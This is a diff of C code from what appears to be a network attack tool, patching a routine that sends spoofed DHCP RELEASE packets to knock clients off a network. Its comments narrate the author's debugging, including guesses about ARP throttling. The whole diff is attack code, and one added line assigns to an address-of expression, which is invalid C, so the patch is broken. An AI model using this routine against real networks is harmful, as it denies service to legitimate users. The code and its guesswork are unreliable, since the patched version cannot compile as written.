@@ -862,13 +862,13 @@ void dhcp_th_dos_send_release( void *arg )
 
     /* MAC from the Server - wait for a packet and try to learn the MAC address of the server
     Quit if returned -1. This error will occur if there's errors with allocating memory or the address is not learned by the end of waiting time*/
-    //NOTE - THE LOGS SHOW THAT IT FAILS ON THIS IF AND QUITS
+    //NOTE - The attack used to fail in this spot, however it has been resolved and now teh attack fails further on, however on the same function
     if (dhcp_learn_mac(attacks, aux_long1, arp_server) < 0)
     {
         write_log(1, "Error in dhcp_learn_mac for the server\n");
         dhcp_th_dos_send_release_exit(attacks);
     }
-
+    thread_usleep(5000000); // sleep for 5 seconds to see if there's arp throttling
     /* loop */
     /* I believe the condition in english is "while current IP is lesser than the value of the last IP and while the attack is not stopped" */
     while ((aux_long <= (*(u_int32_t *)param[DHCP_DOS_SEND_RELEASE_END_IP].value)) 
@@ -884,17 +884,14 @@ void dhcp_th_dos_send_release( void *arg )
         /* MAC from the victim */
         if (dhcp_learn_mac(attacks, aux_long, arp_mac) < 0)
         {
+            // NOTE - Right now the attack dies right here, as the packet seems to be the exact same as the server one (which gets a reply successfully), just with a different address, arp requests might be throttled by the router?
             write_log(1, "Error in dhcp_learn_mac\n");
             /*dhcp_dos_send_release_exit(attacks);*/
         } else
         if (dhcp_send_release(attacks, aux_long1, aux_long, arp_server, arp_mac) < 0)
         {
             write_log(1, "Error in dhcp_send_release\n");
-            /*If I had to make an educated guess, this next line might be causing trouble
-              As It will quit the entire thread on an error in the dhcp_send_release
-              And all of the addresses that are after it in the loop will not get the chance to run
-              If the error occurs on the first IP, then others won't be attempted, I feel like this might be the cause
-              But I am yet to test it. In theory other threads should still work and send stuff*/
+            
             dhcp_th_dos_send_release_exit(attacks);
         }
 
@@ -945,7 +942,8 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest) // possible th
       iface_data = (struct interface_data *) dlist_data(p);
       lhandler = iface_data->libnet_handler;
         //aux_long = inet_addr(iface_data->ipaddr); //I think this line right here is what is broken. It is supposed to provide the IP address of the sender, however the packets in the wireshark capture say that ARP reply hsould go to 255.255.255.255
-        memcpy((void *)&aux_long, (void *)param[DHCP_DOS_SEND_RELEASE_CLIENT_IP].value, 4); // I have no clue what I'm doing, I saw this in other part of the script and hope it works lmao
+        //memcpy((void *)&aux_long, (void *)param[DHCP_DOS_SEND_RELEASE_CLIENT_IP].value, 4); // I have no clue what I'm doing, I saw this in other part of the script and hope it works lmao
+        &aux_long = param[DHCP_DOS_SEND_RELEASE_CLIENT_IP].value;
         t = libnet_build_arp(
                     ARPHRD_ETHER, /* hardware addr */
                     ETHERTYPE_IP, /* protocol addr */
@@ -1044,7 +1042,7 @@ dhcp_learn_mac(struct attacks *attacks, u_int32_t ip_dest, u_int8_t *arp_mac) //
     {
         rec_packets++;
 
-        thread_usleep(8000000); //have the thread sleep for 8 seconds
+        thread_usleep(800000); //have the thread sleep for 0,8 seconds
 
         if ( interfaces_get_packet( attacks->used_ints, NULL, &attacks->attack_th.stop, p_data.header, p_data.packet, PROTO_ARP, 5 ) == NULL ) 
         {
